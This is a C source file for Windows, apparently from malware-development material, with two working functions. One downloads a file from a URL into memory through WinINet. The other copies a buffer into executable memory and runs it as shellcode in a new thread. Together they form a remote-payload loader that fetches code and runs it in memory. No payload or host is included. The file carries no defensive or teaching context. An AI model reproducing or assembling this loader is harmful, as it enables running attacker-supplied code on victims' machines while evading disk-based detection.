#include <Windows.h>
#include <stdio.h>

#include <Wininet.h>
#pragma comment(lib, "Wininet.lib")

BOOL FetchFileFromURLW(IN LPCWSTR szFileDownloadUrl, OUT PBYTE* ppFileBuffer, OUT SIZE_T* pdwFileSize) {


	HINTERNET	hInternet = NULL,
				hInternetFile = NULL;

	PBYTE 		pTmpPntr = NULL,
				pFileBuffer = NULL;
	DWORD		dwTmpBytesRead = 0x00,
				dwFileSize = 0x00;

	if (!ppFileBuffer || !pdwFileSize)
		return FALSE;

	if (!(hInternet = InternetOpenW(NULL, 0x00, NULL, NULL, 0x00))) {
		printf("[!] InternetOpenW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(hInternetFile = InternetOpenUrlW(hInternet, szFileDownloadUrl, NULL, 0x00, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0x00))) {
		printf("[!] InternetOpenUrlW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pTmpPntr = LocalAlloc(LPTR, 1024))) {
		printf("[!] LocalAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}


	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpPntr, 1024, &dwTmpBytesRead)) {
			printf("[!] InternetReadFile Failed With Error: %d \n", GetLastError());
			goto _END_OF_FUNC;
		}

		dwFileSize += dwTmpBytesRead;

		if (!pFileBuffer)
			pFileBuffer = LocalAlloc(LPTR, dwTmpBytesRead);
		else
			pFileBuffer = LocalReAlloc(pFileBuffer, dwFileSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (!pFileBuffer) {
			printf("[!] LocalAlloc/LocalReAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
			goto _END_OF_FUNC;
		}

		memcpy(pFileBuffer + (dwFileSize - dwTmpBytesRead), pTmpPntr, dwTmpBytesRead);
		memset(pTmpPntr, 0x00, dwTmpBytesRead);

		if (dwTmpBytesRead < 1024)
			break;
	}

	*ppFileBuffer = pFileBuffer;
	*pdwFileSize = dwFileSize;

_END_OF_FUNC:
	if (pTmpPntr)
		LocalFree(pTmpPntr);
	if ((!*ppFileBuffer || !*pdwFileSize) && pFileBuffer)
		LocalFree(pFileBuffer);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	return (*ppFileBuffer != NULL && *pdwFileSize != 0x00) ? TRUE : FALSE;
}

BOOL ExecuteShellcodeInLocalProcess(IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {

	PBYTE		pAddress = NULL;
	DWORD		dwOldProtection = 0x00;
	HANDLE		hThread = NULL;

	if (!pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
		return FALSE;

	if (!(pAddress = VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		printf("[!] VirtualAlloc Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!VirtualProtect(pAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	memcpy(pAddress, pShellcodeAddress, sShellcodeSize);

	if (!(hThread = CreateThread(NULL, 0x00, pAddress, NULL, 0x00, NULL))) {
		printf("[!] CreateThread Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	*ppInjectionAddress = pAddress;
	if (phThread)
		*phThread = hThread;

	//	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}
